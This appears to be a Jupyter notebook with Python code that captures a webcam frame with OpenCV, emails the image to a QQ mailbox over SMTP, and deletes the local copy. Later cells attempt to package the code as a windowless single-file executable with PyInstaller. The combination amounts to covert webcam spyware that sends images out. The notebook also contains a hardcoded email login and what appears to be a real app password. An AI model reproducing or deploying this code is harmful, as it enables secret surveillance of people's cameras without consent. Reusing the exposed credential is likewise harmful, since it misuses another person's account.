{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [],
   "source": [
    "import smtplib\n",
    "from email.mime.multipart import MIMEMultipart\n",
    "from email.mime.text import MIMEText\n",
    "from email.mime.image import MIMEImage\n",
    "import cv2\n",
    "import os\n",
    "\n",
    "def send(img):\n",
    "    sender = '310835246@qq.com'\n",
    "    receivers = '310835246@qq.com'\n",
    "    message = MIMEMultipart('related')\n",
    "    subject = 'test'\n",
    "    message['Subject'] = subject\n",
    "    message['From'] = sender\n",
    "    message['To'] = receivers\n",
    "    content = MIMEText('<html><body><img src=\"cid:imageid\" alt=\"imageid\"></body></html>', 'html', 'utf-8')\n",
    "    message.attach(content)\n",
    "    file = open(img, \"rb\")\n",
    "    img_data = file.read()\n",
    "    file.close()\n",
    "    img = MIMEImage(img_data)\n",
    "    img.add_header('Content-ID', 'imageid')\n",
    "    message.attach(img)\n",
    "\n",
    "    try:\n",
    "        server = smtplib.SMTP_SSL(\"smtp.qq.com\", 465)\n",
    "        server.login(sender, 'dhwwraocpelsbjhi')\n",
    "        server.sendmail(sender, receivers, message.as_string())\n",
    "        server.quit()\n",
    "    except smtplib.SMTPException as e:\n",
    "        print(e)\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [],
   "source": [
    "cap = cv2.VideoCapture(0)\n",
    "for item in range(1):\n",
    "    cat, frame = cap.read()\n",
    "    if(frame is None) == False:\n",
    "        cv2.imwrite('1.png', frame)\n",
    "    \n",
    "        send('1.png')\n",
    "        os.remove('1.png')\n",
    "    else:\n",
    "        break\n",
    "\n",
    "cap.release()\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [
    {
     "ename": "SyntaxError",
     "evalue": "invalid syntax (<ipython-input-1-3d7d7b11f8d2>, line 1)",
     "output_type": "error",
     "traceback": [
      "\u001b[0;36m  File \u001b[0;32m\"<ipython-input-1-3d7d7b11f8d2>\"\u001b[0;36m, line \u001b[0;32m1\u001b[0m\n\u001b[0;31m    Pyinstaller -F -w setup.py\u001b[0m\n\u001b[0m                          ^\u001b[0m\n\u001b[0;31mSyntaxError\u001b[0m\u001b[0;31m:\u001b[0m invalid syntax\n"
     ]
    }
   ],
   "source": [
    "Pyinstaller -F -w setup.py"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Looking in indexes: https://pypi.douban.com/simple\n",
      "Requirement already satisfied: pyinstaller in ./my_env/lib/python3.6/site-packages (3.6)\n",
      "Requirement already satisfied: altgraph in ./my_env/lib/python3.6/site-packages (from pyinstaller) (0.17)\n",
      "Requirement already satisfied: setuptools in ./my_env/lib/python3.6/site-packages (from pyinstaller) (39.0.1)\n",
      "Could not build wheels for pyinstaller, since package 'wheel' is not installed.\n",
      "Could not build wheels for altgraph, since package 'wheel' is not installed.\n",
      "Could not build wheels for setuptools, since package 'wheel' is not installed.\n",
      "Note: you may need to restart the kernel to use updated packages.\n"
     ]
    }
   ],
   "source": [
    "pip install pyinstaller -i https://pypi.douban.com/simple"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n",
      "Usage:   \n",
      "  /home/yuhao/environments/my_env/bin/python3 -m pip install [options] <requirement specifier> [package-index-options] ...\n",
      "  /home/yuhao/environments/my_env/bin/python3 -m pip install [options] -r <requirements file> [package-index-options] ...\n",
      "  /home/yuhao/environments/my_env/bin/python3 -m pip install [options] [-e] <vcs project url> ...\n",
      "  /home/yuhao/environments/my_env/bin/python3 -m pip install [options] [-e] <local project path> ...\n",
      "  /home/yuhao/environments/my_env/bin/python3 -m pip install [options] <archive url/path> ...\n",
      "\n",
      "-i option requires 1 argument\n",
      "Note: you may need to restart the kernel to use updated packages.\n"
     ]
    }
   ],
   "source": [
    "pip install wheel -i"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.6.9"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
